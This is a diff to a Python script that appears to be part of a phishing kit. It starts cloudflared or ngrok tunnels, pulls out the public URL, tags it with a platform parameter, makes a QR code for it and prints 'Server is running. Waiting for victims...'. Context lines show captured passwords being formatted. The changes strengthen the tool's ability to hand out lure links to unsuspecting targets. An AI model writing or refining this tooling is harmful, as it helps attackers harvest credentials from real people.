@@ -516,26 +516,68 @@ Password: {password}
                         ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE,
-                        creationflags=subprocess.CREATE_NO_WINDOW
+                        creationflags=subprocess.CREATE_NO_WINDOW,
+                        text=True,
+                        bufsize=1,
+                        universal_newlines=True
                     )
                 else:
                     self.cloudflared_process = subprocess.Popen(
                         ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
                         stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE
+                        stderr=subprocess.PIPE,
+                        text=True,
+                        bufsize=1,
+                        universal_newlines=True
                     )
                 
-                # Wait for tunnel to be ready
-                time.sleep(3)
+                # Wait for tunnel URL
+                start_time = time.time()
+                timeout = 30
+                url_found = False
                 
-                if self.cloudflared_process.poll() is not None:
-                    console.print("[red]Failed to start cloudflared tunnel[/red]")
+                console.print("[yellow]Waiting for tunnel to be established...[/yellow]")
+                
+                while (time.time() - start_time) < timeout and not url_found:
+                    if self.cloudflared_process.poll() is not None:
+                        error = self.cloudflared_process.stderr.readline().strip() if self.cloudflared_process.stderr else "Unknown error"
+                        console.print(f"[red]Cloudflared process terminated unexpectedly: {error}[/red]")
+                        return False
+                    
+                    for pipe in [self.cloudflared_process.stdout, self.cloudflared_process.stderr]:
+                        line = pipe.readline().strip()
+                        if line:
+                            if "trycloudflare.com" in line:
+                                # Extract URL using regex
+                                url_match = re.search(r'https?://[^\s|\]]+\.trycloudflare\.com', line)
+                                if url_match:
+                                    url = url_match.group(0)
+                                    # Append platform parameter
+                                    url = f"{url}?platform={platform}"
+                                    
+                                    # Display success message
+                                    console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
+                                    console.print(f"[bold green]Tunnel URL: {url}[/bold green]")
+                                    console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
+                                    
+                                    # Generate QR code
+                                    self.generate_qr_code(url, platform)
+                                    
+                                    url_found = True
+                                    break
+                
+                if not url_found:
+                    console.print("[red]Failed to get tunnel URL[/red]")
                     return False
                 
                 # Start monitoring thread
                 monitor_thread = threading.Thread(target=self.monitor_connection, args=("cloudflared",))
                 monitor_thread.daemon = True
                 monitor_thread.start()
+                
+                # Display waiting message
+                console.print("\n[bold yellow]Server is running. Waiting for victims...[/bold yellow]")
+                console.print("[bold yellow]Press Ctrl+C to stop the server[/bold yellow]\n")
                 
                 return True
                 
@@ -656,12 +698,40 @@ Password: {password}
                     console.print("[red]Failed to start ngrok tunnel[/red]")
                     return False
                 
-                # Start monitoring thread
-                monitor_thread = threading.Thread(target=self.monitor_connection, args=("ngrok",))
-                monitor_thread.daemon = True
-                monitor_thread.start()
+                # Get tunnel URL from ngrok API
+                try:
+                    response = requests.get('http://127.0.0.1:4040/api/tunnels')
+                    if response.status_code == 200:
+                        tunnels = response.json()['tunnels']
+                        if tunnels:
+                            url = tunnels[0]['public_url']
+                            # Append platform parameter
+                            url = f"{url}?platform={platform}"
+                            
+                            # Display success message
+                            console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
+                            console.print(f"[bold green]Tunnel URL: {url}[/bold green]")
+                            console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
+                            
+                            # Generate QR code
+                            self.generate_qr_code(url, platform)
+                            
+                            # Start monitoring thread
+                            monitor_thread = threading.Thread(target=self.monitor_connection, args=("ngrok",))
+                            monitor_thread.daemon = True
+                            monitor_thread.start()
+                            
+                            # Display waiting message
+                            console.print("\n[bold yellow]Server is running. Waiting for victims...[/bold yellow]")
+                            console.print("[bold yellow]Press Ctrl+C to stop the server[/bold yellow]\n")
+                            
+                            return True
+                except Exception as e:
+                    console.print(f"[red]Error getting ngrok URL: {str(e)}[/red]")
+                    return False
                 
-                return True
+                console.print("[red]Failed to get ngrok tunnel URL[/red]")
+                return False
                 
             except Exception as e:
                 console.print(f"[red]Error starting ngrok tunnel: {str(e)}[/red]")
